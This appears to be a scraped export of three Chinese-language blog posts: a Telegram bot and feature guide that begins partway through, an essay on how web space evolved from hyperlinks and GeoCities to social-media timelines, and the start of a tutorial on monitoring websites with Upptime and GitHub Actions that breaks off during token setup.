@like，预设一些喜欢的投票符号（最多 6 个），然后就可以在聊天框输入 @like 调用这些预设。 @music 帮你找到动听的古典音乐。 @pic 图片搜索 by Yandex（支持中英文）。 @QuizBot 答题机器人：创建一份只有单选题的考卷。点此 开始测试你对 Telegram 的了解程度。访问 quiz.directory 查看更多问卷。 @sticker 👍 检索所有与 Emoji 相关表情包。例如 @sticker 😎 。 @telegraph 👍 登录和编辑 Telegraph 文章，并 统计 telegra.ph 的浏览量。 @vid 帮你查找 YouTube 视频（支持中文搜索）。 @vote 投票机器人。 @wiki 维基百科。搜索中文条目 @wiki zh 猫；搜索英文条目 @wiki en cat @youtube 帮你查找 YouTube 视频（不支持中文搜索）。 🧱 非内联机器人 以下 Bots 不能在聊天窗口调取使用。 🧡 RSS 机器人 （如果）你不懂得 RSS，上网的效率和乐趣都要大打折扣。by 阮一峰 相比于传统的 RSS 客户端，Telegram 上的 RSS 订阅器的优点是： 自动记录上次浏览的位置 某些 RSS Bots 支持 ⚡ INSTANT VIEW 在 All About RSS 里推荐了很多 RSS Bots： @FeedManBot @TheFeedReaderBot：不仅可以订阅 RSS 源，还可以在 Telegram 上浏览 Twitter。 @Feed2Telegram_bot：免费用户只有 5 条 Feeds；发送 Twitter（推特）链接，即可追踪。 @el_monitorro_bot @newlearner_rss_bot @NodeRSS_bot …… 以上大部分 Bots 都能免费使用，但是保不齐哪天服务器撑不住，就停止运营了，所以记得定期导出 OPML 文件作为备份。 如果有 VPS，自己搭一个专用的 RSS Bot 会是不错的选择。 🎵 音乐机器人 通过 @ChinoNyanBot 可以在 Telegram 上在线点歌。 点歌教程 网易音乐：/netease + 歌名 / 歌手名 腾讯音乐：/tencent + 歌名 / 歌手名 虾米音乐：/xiami + 歌名 / 歌手名 酷狗音乐：/kugou + 歌名 / 歌手名 其它点歌（下歌）机器人 @vkm_bot @vkmusic_bot @haoyybot @u2bu_mp3_bot @SongIDbot：听歌识曲。 @getmediabot：下载音乐、歌词、视频等媒体。 @YTAudioBot：下载 YouTube 音频。 小技巧：在音频播放器中，长按住「下一首」 和「上一首」按钮可以快进和倒带。Press and hold on the Next and Previous buttons to fast-forward and rewind. 💽 DC 查询 Telegram 的服务器分布在世界各地的数据中心（Data Center，简称 DC）。如何查询自己所在的数据中心（好像没啥用）： 第一步，在隐私和安全设置中，（临时）开启所有人都能查看你的头像（Profile Photos）。 第二步，选择一个查询 Bot： Bot Info @luxiaoxun_bot 鲁小迅 @WooMaiBot 干物妹！小霾 第三步，发送 /dc，即可获得你所在的数据中心。 🎁 其它机器人 Bot Info @bingdict_bot 基于 Bing 开发的中英文翻译机器人。 @BotsArchiveBot 收集了上千个 Bots（仅限英文版）；官网。 @CorsaBot 👍 Make Instant View from any article. 快速把文章把文章备份到 Telegraph。 @cnLottery_bot Telegram 群组抽奖工具。 @DogFatherPublicbot App Store 价格监控。 @githubbot 推送 GitHub 仓库的动态。 @GmailBot 👍 在 Telegram 上收发 📧 Gmail。 @he_weather_bot 和风天气小棉袄。另外还有 WIEN 产品的 广州、深圳、东莞 的天气速报频道。 @IFTTT With this bot you can use IFTTT to link your Telegram groups or channels to more than 360 other services like Twitter and Instagram, or connected devices like Hue lights and Nest. @jobs_bot This bot lists career opportunities at Telegram and accepts candidates' applications. Available at https://telegram.org/job @LivegramBot 👍 不加好友也能私聊，可用于收集反馈及绕开 +86 手机号码的限制。因为经过一层转发，消息一旦发送，便无法删除，但有个短暂的修改期。 @MakeQrBot 发送文字，生成对应的二维码。 @sssoou_bot Telegram 搜索，支持中文。 @Stickers 👍 创建属于自己的表情包。 @tweet_for_me_bot 在 Telegram 上发布 Twitter 动态。 @tgstogifbot 把 Telegram 上 tgs 格式的表情包转换为 gif 格式。 @utubebot 同时下载 YouTube 的视频和音频，不过会推送一些广告。 @verifybot 加了官方认证后，名字后面有个 ✅（verify a big andactive official channel, bot or public group）。 @zzzdmbot 真正值得买推送机器人，可以根据关键词订阅推送什么值得买精选优惠信息。 更多 Bots 推荐，请参阅 Raw 博客 以及 合集网。 👥 群组管理 庭说的群组是 @tingtalk_group 群组人数最高 20 万。转换为广播组（Broadcast Group）之后，人数将不受限制，但只有管理员可以说话，但是成员仍然可以加入语音聊天。注意，切换之后，将不能回退到普通群组。 静音群组只有在 @ 提到你、 Reply 回复你和 Pin 管理员发布群通知时才会收到通知。 新加入的成员可以看到全部的群聊历史记录（New members can see the entire message history when they join）。 加入群组之前，可看到（单向）好友是否在列。如果不想让好友知道你加入了某个群组，注册一个小号吧。 支持在任何设备上发起语音聊天（Voice Chats） 在 Telegram Desktop 和原生 macOS app 中，支持设置发言快捷键，例如大小写锁定键。（On Telegram Desktop and in the native macOS app, you can choose a push-to-talk key for Voice Chats, to control your mic even when Telegram is not focused. At long last, we've found a use for your Caps Lock key.） 需要在翻墙服务/软件上开启 UDP 转发。 截至 2021 年 1 月 13 日，语音聊天支持 5000 人同时参与。Voice Chats for up to 5,000 participants. 主持人可以控制发言者的音量（Adjust the Volume），这个设置是全局的，对所有听众有效。 👮 管理之道 可删除成员的单条消息或全部消息。 慢速模式（Slow Mode）：在 10 秒 / 30 秒 / 1 分钟 / 5 分钟 / 15 分钟 / 1 个小时内，成员只能发送一条消息，这样可以使小组中的对话更加有序，也可以提高每条信息的价值。 群组权限：管理员可以限制所有成员或单个成员只能发送特定类型的内容（Partial bans），如此一来，你便可建立一个没有表情贴纸或者 gif 的高质量交流社区。或者甚至完全限制成员发送信息，让管理员彼此交谈，而群成员则默默地旁观。 可对群主（creator）及管理员（administrators）设置自定义头衔（Custom title）。 管理日志（Recent Admin Actions）：当多个管理员在一起工作时，很容易搞不清楚哪个管理员或管理机器人，在什么时候做了什么。所以 Telegram 的管理员页面增加了「最近动作」功能。用于存储过去 48 小时内在组中执行的所有服务操作的日志，仅对管理员可见。 2020 年 9 月 30 开始，管理员可以匿名发布消息了（Anonymous Group Admins）。 成员超过 500 人后，自动开通群组分析功能。Owners of large groups with over 500 members can view beautiful, detailed graphs about its activity and growth. 🔐 管理机器人 在群组设置里搜索 Bots 名字，即可添加，然后赋予尽可能少的权限。 @policr_mini_bot 开源验证机器人，详情参见 官网。同类的 Bot 还有 SCP-079。 赋予 Delete messages 和 Ban users 权限。 @DeleteEventsBot 或 @AntiServiceMessage_Bot 删除冗余的事件通知，例如谁加入了群组。强烈建议群组管理员装备上这个 Bot，减少信息噪音。 赋予 Delete messages 权限。 @areply_bot 自动解除关联频道（Linked hannel）转发到群组的自动置顶消息，并恢复之前的置顶消息。 赋予 Pin messages 和 Delete messages 权限。 其它管理机器人： @keyworddel_bot：自动删除群组推广、广告、博采等消息。 🤐 私密聊天 Cloud Chats（默认聊天模式） 客户端 -服务器 / 服务器 - 客户端 信息存储在 Telegram Cloud 中进行加密，这使云消息既安全又可以立即从任何设备访问，即使丢失了设备。所以你不需要将所有的信息历史记录存储在手机上，当你需要的时候，你可以随时在 Telegram 下载（缓存）旧的信息和媒体，这为你节省了大量的磁盘空间和内存。 Secret Chats（不支持在 Windows 和 Web 上发起） 客户端 - 客户端 聊天记录不能云备份，因为私人数据没有经过 Telegram 的同步服务器，所以没有任何人可以破解，包含 Telegram 团队本身。 关联阅读：为什么电报的端到端加密不是默认的？ 只能通过原始设备访问历史消息。退出并再次登录，将失去所有的秘密聊天记录。 可设置阅后即焚（self-destruct）计时器，自动销毁消息或媒体文件（只适用于计时器设置后发送的消息，对早期的信息没有影响）。 不能转发消息。 不能编辑已发送的消息。 Android 设备不能截屏；iOS 设备可以截屏 ，但对方截屏时你会收到通知。不过，只建议与你信任的人分享敏感信息。 毕竟，对方可以用另外一台设备给屏幕拍照。 删除发送方的消息，接收方那边也会强制删除。 😎 Telegraph Telegraph 一个极简的匿名内容发布工具（Minimalist publishing tool）。如果内容侵权了，例如使用有版权的图片，可能文章会被投诉下架。 ☝️ 用法一 此法不需要注册账号与下载软件。 在手机或电脑的浏览器的地址栏输入 telegra.ph 写文章 发布（PUBLISH） ⚠️ 内容发布之后，只要清除浏览器缓存，便无法再编辑文章，也不能追溯到文章作者。 ✌️ 用法二 通过 Telegraph 机器人 @telegraph 管理文章： 能看到你发了多少篇文章，多少人看了（但是读者依旧看不到作者是谁）。 在任意聊天窗口输入 @telegraph，即可弹出你发布的所有文章。 📝 发布流程 在 Telegram 打开 Telegraph 的小管家 @telegraph 根据提示配置 Account 写文章：Author 可以写频道或者群组的 Public link（例如 https://t.me/tingtalk），读者点击作者即可跳转。 发布（PUBLISH） ✍️ 修改流程 在任何一个设备（across any number of devices）都可以再次编辑文章的标题、作者和正文（除了文章链接）： Log in as *** on this device 返回 @telegraph My posts，点击文章的标题 电脑：自动跳转到浏览器打开，然后在右上角找到 EDIT 手机：点击界面的右上角 3 个点，选择 Open in… 用浏览器打开，滑倒文章底部即可看到 EDIT 🔗 如何让文章链接更美观 URL = https://telegra.ph/首次输入的标题-首次发表时的月份 -首次发表时的日期 如果你用中文撰写标题，例如《选择 Telegraph 的 10 个理由》，那么文章链接会变得又臭又长，且不能从链接或者文章主题： https://telegra.ph/%E9%80%89%E6%8B%A9-Telegraph-%E7%9A%84-10-%E4%B8%AA%E7%90%86%E7%94%B1-12-04 要想得到一个 friendlier-looking link，首次编辑请使用英文标题： 英文单词全部小写：10 reasons to choose the telegraph 把 the、a、an 等去掉：10 reasons to choose telegraph 用连字符 - 代替标点和空格：10-reasons-to-choose-telegraph 是否可以精简或者采用另外一种翻译：why-telegraph 再用 Edit 功能修改标题为中文：选择电报的 10 个理由。 📝 如何让文章排版更美观 使用 Markdown 写文章（例如 Typora） 复制 Markdown 预览（不是源代码） 粘贴到 telegra.ph，即可快速排出精美的文章（不支持某些格式，例如多级项目列表） 🔗 关联阅读 Telegram FAQ：电报常见问题（英文网页）。 The Evolution of Telegram：电报的演化（简史）。 Articles about Telegram：这些文章涵盖了 Telegram 及其赞助商、全球企业家帕维尔•杜罗夫（Pavel Durov）。 Telegram Messenger - Twitter：Keep evolving and stay in touch，官方推特会介绍各种 #TelegramTips。 Telegram - reddit Telegram logos：Please feel free to use these Telegram logos. Just make sure people understand you're not representing Telegram officially. A long way from Moscow：'Russia's Mark Zuckerberg' took on the Kremlin - and lost his country by Christopher Miller Telegram X 介绍视频：超级炫酷，一定要看。 给电报找 Bug：欢迎安全研究人员将 Ta 们在 Telegram 应用程序或协议中发现 🧐 的任何问题提交到 security@telegram.org。 根据问题的严重程度，奖金从 500 美元到 10 万美元或更多。 Telegram 背后的故事 Telegram 传奇：一个关于俄罗斯富豪、黑客、极权和阴谋的创业故事 - 霍炬 关于 Telegram 的一些事 - 守望的麦子：我更加相信一定会有越来越多的理想主义者，他们相信 平等 和自由，坚守信念和价值观，每天充实地生活着。 我为什么选择 Telegram 来运营粉丝社群 | 规则、经验和思考 - 罗磊 Telegram 教程全指南 by TG极客 Telegram 群组、频道、机器人 - 汇总分享 - 聪聪 Blog Telegram 频道：Newlearnerの自留地 导航页 Stay home. Wash your hands. Be safe. And stay tuned for our next updates! It is already brewing in our dungeons! 呆在家，常洗手，敬请关注，更强大的 Telegram 已经在我们的地牢里酝酿中了！ 📞 与我联系 欢迎读者在 Telegram 搜索 @tingbot 与我取得联系：指出此文疏漏，推荐优质频道和机器人，一起跨越数字鸿沟，共享信息自由。 ","link":"https://blog.gd1214b.icu/post/JYQWA_wHa/"},{"title":"网络空间的兴衰","content":" 本文转自：https://www.orangeclk.com/2016/10/03/cyber-time-space/ 时间的衰落·空间的崛起 传统的音频与视频是线性的，这在磁带与录像带中表现最为明显。音频与视频只能按顺序播放，倒带与快进也只能按照顺序进行，不能随机读取[1]。 现代音频视频播放器提供了进度条操作的接口，可以在时间轴上选取播放时间，有了一定随机读取的功能。但大体上音频与视频仍然是线性媒体，它只有按照时间顺序播放时才能提供意义，计算机提供的操作接口只是让人可以选择播放起点。音频视频中各帧内容只有时间关系，没有其他联系。 而文字不同。原始的文字同样是线性媒体，需要按照顺序阅读才能获取意义。但朴素的书已经比朴素的录音带有更先进的结构，用户可以根据页码或自己对书厚度的感知直接翻到想看的页面，而录音带必须按照顺序快进快退到指定位置。 人们在阅读文字时，常常快速扫描文字，找到感兴趣的部分再按照顺序细致阅读，这也达到了随机访问的效果。而音频与视频不能快速扫描，只能依然按照时间顺序快进或快退，来搜寻想要的内容，有较强的线性。 在互联网中，文字进化为超文本，任意规模的文字都可以变身为超链接，指向另一个网页。网站之间是平等的，他们没有时间顺序关系，也不需要网站之间的时间顺序关系来表述意义。 传统上，叙事总是要完成一个目的，叙事是修辞学（rhetoric）的艺术[2]，它总是希望能给读者提供某件事物、某种想法、某个概念、某些道德训诫[3][4][5][6]。经典叙事总有时间上的先后顺序，我们听故事，一面讨厌剧透的人，一面又总是想问“后来呢？”在空间叙事中，我们则没有这种感触，自己东张西望到处看一遍便可。文学、电影都有这样的时空特性。 万维网不依赖传统的叙事，它不说服谁，没有时间顺序，不主动提供意义，它本身的呈现就是意义，互联网漫游者可以在这个互联网世界任意漫游，各自体验到不同的意义。 万维网由链接串结，都可以通过网址链接访问。互联网没有时间线性。不同的人在万维网世界随着链接漫游，是为网络冲浪（surfing the net），或者网络漫游（cyberflâneur），构成早期互联网的浪漫意象。链接宛如传送门，引导游客从一个世界穿梭到另一个世界。游客探索互联网的历程构成了互联网对游客本人的意义，这种漫游/冲浪是空间的，从用词就可以看出来。早期的互联网浏览器（browser）命名也能体现后现代的空间思潮，微软的 Internet Explorer 是“互联网探索者”，网景的 Navigator 是“领航员”，苹果的 Safari 是“野外旅行”，都明确指向空间穿梭的意思。用户通过超链接在一个又一个空间之间穿梭。每个空间都有自己的叙事，都讲自己的故事，产生自己的意义。但是这些意义不是互联网的意义，就如同北京上海一城一市的意义不是世界的意义。古时候交通不便，旅行艰难，人一生一世难以体会世界空间的广大，只能数着时间过日子，看不到广阔空间的意义。信息空间亦如是，在互联网之前，广阔的信息、知识对人是不可见的，人只能从有限的书报、广播电视频道、人际交往中获得信息。在互联网之前，信息编制得最发达之处可能是图书馆。图书馆的信息等级森严，秩序井然。书本与类目构成树形结构，每两本书之间只有一条路径可连通[7]，信息之间丰富的关系仍然没有展开。我曾在清华大学图书馆检索信息论专著，然而却发现这些偏数学物理计算机的书都在文科图书馆，原因大致是信息论下属于信息传播，于是被归到了人文科学。在图书馆的树形秩序中，每本书分且仅分在一类之下，有些旧知识交叉得到的新信息，就无法合理安放。每项信息只与所属和下属的信息相连，很多信息之间的关系也没有包括进来。 直到超链接面世，人类拥有了表达信息关联的工具。在互联网中，空间结构由链接塑造，而空间中的每一个结点、每一个世界都可以是传统的样子。在每一个空间中，空间的主人都可以用文字、音频、视频讲述这个世界的故事。每个人都可以在网络上创建自己的空间，再把这个空间和网络的其他部分连接起来。互联网整体给人类提供了一个前所未有的空间世界，让人们第一次有机会在信息海洋中漫游、冲浪。互联网本身不需要按照时间顺序理解，互联网本身也不讲故事。人们需要的只是从一个空间跳转到另一个空间，寻找链接传送门，各处穿梭，体验世界。链接，是互联网最重要的特征，它突破了文字、音频、视频依附于时间、仰赖于叙事的局限，给了消费者很多对信息的消费自由，提供了目前最丰富的信息结构。 19 世纪至 20 世纪，文学出现空间化的浪潮，小说不再讲故事，而是会注重空间叙事。这可能与人类实际生活的变化有关，交通与通信的发展让人类从大航海到外太空探索不断，而且能即时沟通，很少感受时间与等待。同样的思潮也在 20 世纪蔓延到了其他方面，例如戏剧。1980 年代，批评家们认为空间化是现代性的一项核心特征。所谓空间化，就是让空间居于时间之上、抹平历史时间、拒绝宏大叙事。[8]万维网正是在这个时代背景下诞生。与传统的文本、音频、视频相比，万维网颠覆了时空在媒体中的关系。在文本、音频、视频中，空间是依附于时间的；而在万维网中，时间依附于空间。 空间的生产·空间的碎片 原始万维网的野性世界不适合普通人。探索是费力的，探险家是少数，能在新空间建造城市的探险家更是少数。早期万维网拥有最扁平宽阔的结构，但只有少数人可以一窥门径。后来，人们在互联网空间建造了很多基础设施，与人方便。首先是生产工具。早年的互联网居民如果想建造新居，需要自己购买服务器、配置邮件服务、写后端逻辑、写前端页面，从一砖一瓦码起。但后来就有厂商开始提供毛坯房，只需用户装修即可，其中不得不提的便是 GeoCities。 GeoCities，字面意思“地理城市”，单从名字上就能看出浓重的空间意味。它诞生于 1994 年，与同样名称饱含空间感的 IE 浏览器几乎同岁。GeoCities 是一家网页寄存服务公司，用户可以把自己制作好的网页上传到 GeoCities，无需打理网络服务的种种，便可以让自己制作的网站上线。我们中小学微机课讲制作网页的时候，往往会提到“购买空间，把网页上传到空间”这一步骤，GeoCities 也就是这种空间商，至今网络上仍然有很多贩卖空间的服务公司。 GeoCities 后来由雅虎收购，中文称作“雅虎地球村”。GeoCities 曾经用不同的服务器服务不同的分站/子版，每个分站都以真实地名命名。例如，所有与计算机相关的站点都放在“硅谷”分站上，所有和电影有关的站点都放在“好莱坞”分站上。其命名与划分表现出很强的空间性，让人真产生漫游、旅行的印象。每个分站内的具体站点如前文所述，都是万维网用户自己制作的，所以风貌不同，就如同一条街上每家店铺装帧有别。 后来生产工具越来越多，出现了简装和精装房，连制作网页的装修功夫也省掉，用户可以直接填充内容。是为博客、轻博客之类。到了这一步，几乎每个人都可以在万维网上建立自己的小世界，供人浏览。2005 年以后，QQ 空间成为中国非常流行的博客工具，很多人都在 QQ 空间上经营着自己的一方天地。腾讯也把这项业务的名字换做 QQ“空间”，正是网络空间的写照。 到了博客这一步，万维网的空间世界已经蔚为大观，但网络时空的演化仍并未到此结束。 经营博客空间对普通人来说，还是太难。即便能写博客的人已经比能制作网页的人多了很多，但写作仍是件麻烦事，而且看文章也是件麻烦事。在万维网这个世界里，人类后来又发明了更多效率工具打理这些个人空间，把读写都简化了很多。这便是社交网络：Facebook、微博、推特等等。 进步不是一蹴而就的，社交网络的种种端倪，在博客时代、甚至网页寄存空间时代，就已有显现。例如，QQ 空间已然有了社交网络的影子，用户可以控制个人空间的访问权限，有社交关系，可以发说说。在 QQ 空间完成博客任务的同时，已经是相当完备的社交网络，推出时间与美国的 Facebook 也只差一年。类似的，新浪微博也是从新浪博客参考推特发展而来，从名称上就能看出其发展轨迹。 在社交网络中，空间主人不再需要撰写长篇大论，也无需整理文章格式，只要随手发送拍摄的照片，就可以维护自己的空间世界。平台进一步接管了顾客的工作。从网页托管空间，到博客空间，再到社交网络空间，大公司为普通用户代劳的事越来越多，普通用户需要做的事越来越少。每个人的空间也越来越像，个性越来越不足，但是效率却大大提升了。现实的街区也一样。最早的街区由居民自发经营，各商铺各自打造，店主人可发挥自由，不过街区缺乏规划。但缺乏规划的街区视觉混乱，顾客要费力才能辨别店铺的功能；建筑参差不齐，交通也容易堵塞；店铺的位置关系也未必合理，不能消化更多客流。如果街区能够有所规划，则顾客店主都得方便，各自省力获利。但这时店铺主人能自由作主的区域便小了，很可能外部面貌与建筑格局都已固定，只能在内饰上做文章。顾客看到的也容易是整齐划一的建筑，可供探索的内容少了很多。城市的商业中心看起来都差不多，正是街区工业发达的体现。为效率和商业牺牲自由与艺术，是物理街区和网络街区共同经历的过程。[9] 我不认为这一过程是负面的。起先，人们需要完整地搭建、发布网站，只有很少的人能做到；后来，人们只需要制作页面，剩下的工作由网页托管空间代办，但仍有制作网页的门槛；再后，博客出现，人们连页面都不用做，只需填写文字、链接，购买皮肤，几乎人人都可以操作。到这里，效率设施日臻完善，但博客站点一眼望去长得都差不多，多样的美感顿失，一如城市商业中心的相似。博客的广告也有很多为平台方包揽，一如成熟街区的商业广告。在牺牲个性的前提下，参观与创造网络空间的门槛低了，空间创作者和游客共同得利，互联网从少数人扩张到全人类，泽被环球。 在博客之后，网络科技仍能发展出更自动的效率工具，让无法维护博客的人也能制造自己的空间。这种空间非常小，网络平台商几乎代理建造了空间的全部内容，只剩下一块狭小的碎片供制作者填充。游客也无需适应每一个网站的新环境，他们只要呆在平台里，看每个柜台呈现出的小小空间即可，无需学习各自网站独特的艺术风格、交互方式，减少了接触内容的难度和自己的学习成本。 这样登峰造极的碎片空间，部分造就了社交网络。我们日常经常提到社交网络的内容碎片化，即是如此。 空间的消费·空间的秩序 在社交网络之前，互联网有两条独立的发展轨迹。 第一条是前文详细叙述的万维网空间世界。在这一条轨迹中，互联网尝试实现广播媒体的功能，其内容是开放共享广播的，所有人都可以访问。而广播设施的日趋完善使得任意一个人都可以开设自己的专栏、书刊。在视频共享网站和直播网站兴起后，事实上每一个个人都可以创办自己的电视台。这一部分主要由万维网构成，万维网形成了一个广阔的空间世界。 在另一条轨迹中，互联网尝试实现通信工具的功能，它如同书信电报，是私密的，连接具体的两个人或是一组人。最早的互联网通信设施是电子邮件；后来发展出了即时通信工具，例如 QQ；再后发展处移动通信工具，如微信，几乎已经取代了电话与短信的通信功能。这些设施基本不属于万维网，甚至有时依赖与商业公司的私有协议，它们构成了人们通讯的信息专线。 网络空间有增强真人社交互动的需求，通讯工具也有提高内容消费的需求，两条轨迹相交，形成社交网络。 前文提到，万维网原始的空间世界不仅建设难度高，而且探索、消费难度也很高。人们在不断完善生产工具，让空间建设变简单之外，还在不断完善探索工具，给探索者们提供便捷的交通工具，让用户可以方便地在空间世界中找到自己想要的那个空间。 首先出现的是目录索引。杨致远于 1994 年创办了雅虎，用户可以在雅虎上根据类别索引逐步寻找目标网页。这个时候网络世界就出现了一个类似于图书馆系统的树形秩序，它与互联网本身的扁平结构共同存在。由于网络上的内容越来越多而按照类别索引寻找网站非常麻烦，雅虎又自然地添加了搜索功能。用户键入想找的关键词，再搜索，就可以看到目标网页。这时又出现了搜索入口秩序。此时，典型的互联网门户形态已经成型。在 21 世纪新型搜索引擎崛起之前，雅虎、新浪、搜狐这样提供搜索与分类索引的门户网站掌握了互联网入口，形成了互联网的权力中心。用户想冲浪、探索的时候，他们仍然可以沿着链接浏览每个空间；但当他们需要效率，需要完成功利的任务时，他们多了门户这个选择。 随着万维网规模的迅速扩大，人工编制索引变得越来越难。而与此同时，自动抓取网页且拥有优良排序算法的新型搜索引擎的性能越来越好，人们不再需要费力通过分类索引一层一层地找到自己想要的信息。如同今日之图书馆，我想大家找书也是通过图书馆的搜索引擎来找，不大可能是按照类目一层层寻下去。这时候，搜索引擎就变成了互联网网的主要入口，它成为互联网世界的新权力中心。 索引、搜索，都是万维网的交通工具，它让用户可以快速抵达目的地。如果说分层索引是路标链条，那搜索引擎就是直达特快。同时，交通枢纽和交通线意味着权力。现实中交通枢纽和交通线往往繁华，万维网也一样，万维网的交通设施往往是世界上市值最大的公司，他们的首页就是万维网交通枢纽。普通网站都希望能获得更多的搜索引擎流量，搜索引擎或网站索引如果屏蔽了某个网站，就如同交通线不在某城市经停，会对网站/城市产生立竿见影的不利影响。他们握有这个空间世界的权力，空间世界逐渐产生了自己的秩序。 与此同时，生产工具的发展使得在万维网建造空间的门槛越来越低，用户生产内容（UGC）越来越多。早先，万维网的秩序只要能覆盖到商业组织和社会组织，呈现出机构发布的信息，基本就能满足需求。但现在，大量的内容是海量单一的人生产的，人希望自己发表的内容能够被朋友看到，希望能和朋友就自己的空间发生互动。因此，新的秩序需求出现，人们希望能够根据社交信息浏览空间、发表内容。 很多博客已经有了一些交互与社交的功能，社交网络在博客基础上进一步加强了真人之间的联系。博客提供的空间规模对社交而言仍然太大，而真正的日常社交大多通过你一句我一句的对话完成，很少是你说一大篇我说一大篇。早年相距遥远的人们通过书信沟通，写成长篇大论，是迫不得已，通信不易，怎么写都还不够。在电话、短信、互联网之后，人们才得以体验与线下社交体验更相似的超距社交，而微博、短句的表达方式则很接近人们通信社交的现实。 社交是通信工具天生的功能，而社交是需要消费内容的。大家聊天，总得有个谈资。所以通信工具尝试引入空间世界的公开信息理所当然。除了资讯以外，社交也可以通过娱乐消费完成。这种消费可以是线上的，例如游戏；也可以是线下的，例如吃饭。它们都可以由用户在通信工具发起。手机本来就是通信工具，通信软件是手机的原住民。到了智能手机时代，通信软件的功能大幅增强，手机的地位也大幅提高，通信软件迎来了接入资讯与娱乐的机遇。万维网空间进入通信工具，从另一个角度塑造了社交网络。 时间的回归·时空的交错 让我们回忆电视的结构。电视有很多频道，每一个频道都在播放按照时间秩序叙事的视频节目。再对比现在的手机，手机的每个应用就是一个频道，打开每一个频道，都有一道按照时间顺序呈现的瀑布流。在空间打碎之后，时间作为组合这些碎片的方式，以时间轴的身份重新归来。用户不需要付出探索空间的努力，只要打开频道，信息就按照顺序自动呈现，而信息流仍然由一个个空间碎片组成，同时用户还可以通过点击方便地进入每一个账号的个人空间，每一个个人空间或具体的碎片空间里，内容往往还是按照时间顺序呈现。例如，中国足球队在微博于 2013 年在微博上发过一条“对不起”的微博，点开这条微博，其评论直至今日仍然活跃，这些评论按照时间顺序排列，整理开来就是中国足球三年的输球史，呈现出旧媒体无法展示的历史感。 时间和空间以新的方式结合，时间给了用户一条探索空间的线索。决策是需要付出精力和意志的，在空间变小变碎之后，每个空间很快就能阅览完，所以人们不得不需要频繁地决定下一站旅程去哪里。时间轴代劳了这一切，让用户无需消耗意志和精力就能滑动到下一条。 由于空间碎片的规模很小，单一的空间功能有限，空间碎片必须串联在一起才能呈现意义。试想，如果有一个手机应用，打开之后只能显示一条状态或是一条视频，那么它是没有意义的。只有大规模或富意义的单一空间做成应用才有意义，例如游戏应用、故宫推出的诸多文物应用、魔兽世界小说全集应用等等。普通人日常建造的空间碎片几乎没有做成单一应用的意义，它们必须聚集在一起，由一定的结构串联起来才有意义。这个结构目前通常是时间轴，时间轴不仅能把空间碎片串联起来，而且本身也提供一定意义，可以看出资讯间的时间关系。与电视的区别在于，我们看电视时，想看的是节目的意义，必须按照时间顺序阅读每个镜头才能明白；而在社交网络上，我们想看的是每条状态、每个空间碎片，不需要按照时间顺序阅读内容就能获得意义。在看电视时，我们是时间的奴隶，只有跟随时间的步伐一分一秒才能获得意义；但在浏览社交网络时，时间是我们的工具，我们用手指操纵时间轴，爱滑多快滑多快，想看哪里看哪里。 这一整段历程或许可以和文学比照。文学进入空间时代后，就基本与普通读者分离，大量空间碎片的堆叠让普通读者读不下去，只有学术庙堂中的文学研究者才会购买。文学作品离开了社会，从写到卖在学术圈内成为闭环。然而正常人终究还是喜欢放松的时候读读故事，因此有文学家也在考虑时间的回归。人类的物理空间探索也在冷战太空竞赛之后暂时放慢脚步，进入了对现有空间升级打磨的阶段。互联网也因由时间的回归从早期仅供少数人探索的万维网荒野开发成了几乎人人可享用的手机应用频道组。广袤的原野空间逝去了，取而代之的是涂满商业广告与购买按钮的批量制成品和密不透风的围观人群，流淌在一个又一个独立分隔的应用滚屏瀑布中。 [1]随机读取：可以直接跳到想要访问的地方，读取信息。 [2] Lev Manovich, The Language of New Media, p.77, 2001, MIT Press. [3] 《国语辞典》：修辭是指如何調整語文表意的方法，設計語文優美的形式，使精確而生動的表現出說者或作者的意象，期能引起讀者共鳴的一種藝術。研究此種藝術的學科即為「修辭學」。 [4] 亚里士多德《修辞学》通行本对修辞的定义：“the faculty of observing in any given case the available means of persuasion”。 [5] 维基百科：Rhetoric (pronounced /ˈrɛtərɪk/) is the art of discourse, an art that aims to improve the capability of writers or speakers to inform, most likely to persuade, or motivate particular audiences in specific situations. [6] 由于文论中的“修辞学”与汉语常用词“修辞”的意义不尽相同，中文学者在提到有关“Rhetoric”的论述时，有时会谈“说服力”。说服其实是修辞学的核心内涵，亚里士多德《修辞学》全篇都在谈演讲时如何说服别人。“修辞学”重功利，现在汉语的“修辞”通常指“修辞格”，只是修辞学的一部分，并且侧重于美的表现。罗年生译注亚里士多德《修辞学》中曾提到：“从公元前 4 世纪末期起，演说遍衰弱了，主要原因是由于希腊处在马其顿的高压之下，政治自由受到限制，公元前 3 世纪中期修辞术成为课堂的练习，注重风格，讲究规则，于是小亚细亚的一些希腊城邦兴起一种崇尚华丽而动人情感的‘亚细亚风格’，和赫革西阿斯为代表作家。与此同时，修辞学又遭到伊壁鸠鲁派和斯多葛派哲学家的攻击，被视为无用处，无价值。”他也提到罗马时期，有很多人主张恢复希腊古典时期的修辞学和演说风格。而“罗马以后的修辞术着重风格及词句的修饰”。甲骨文“辞”会意字，是“辩明事理”的意思，《说文解字》：“辞，讼也。”这说明我国古代的“辞”和希腊一样，也源于法庭诉讼，强调讲明道理、说服别人。但中华文明的王权很快就建立了起来，政治演说与法庭辩论的土壤不再。中文“修辞”一般就只作为美学概念，主要内涵为“修辞格”。中华文化和希腊文化在“修辞”的演化历史上有相通之处。 [7] 树结构的基本性质 https://en.wikipedia.org/wiki/Tree_structure https://en.wikipedia.org/wiki/Tree_(graph_theory)。 [8] Lev Manovich, The Language of New Media, p.78, 2001, MIT Press. [9] Evgeny Morozov, The Death of the Cyberflâneur, http://www.nytimes.com/2012/02/05/opinion/sunday/the-death-of-the-cyberflaneur.html ","link":"https://blog.gd1214b.icu/post/sZOPxqKBm/"},{"title":"利用GitHub Actions 监控网站- Upptime","content":"前阵子在网络上看到一个很酷的开源项目： Upptime 每隔一段时间用GitHub Actions 看网站能否访问,若不能访问就用GitHub Issues 回报异常事件,使用GitHub Pages 产生服务状态的页面. GitHub Actions 简介 GitHub Actions是GitHub上的一个自动化服务，你可以把脚本放到上面，当特定事件发生时，自动执行你的脚本。 以Upptime来说，预设是每隔五分钟访问你的网站一次（实际上由于GitHub的限制，间隔可能会更长），同时也会记录每次的response time，让你在页面上看历史纪录等等。 这些动作都写在Actions的脚本中，机器都会自己执行，完全不用动到一根指头。 介绍完之后，就来开始部署Upptime吧。 创建GitHub Repo 进入Upptime的repo 点击 Use this template 创建repo * 输入repo name * 勾选 Include all branches * 点击 Create repository from temple 等一阵子后,就会复制一样的repo到你的帐号下 设置GitHub Pages 到你的repo，点击 Settings 往下找到GitHub Pages 的Source Branch 设为 gh-pages 点击 Save 设置Repository Secret 为了让Upptime有commit和publish网页的权限，需要设定Personal Access 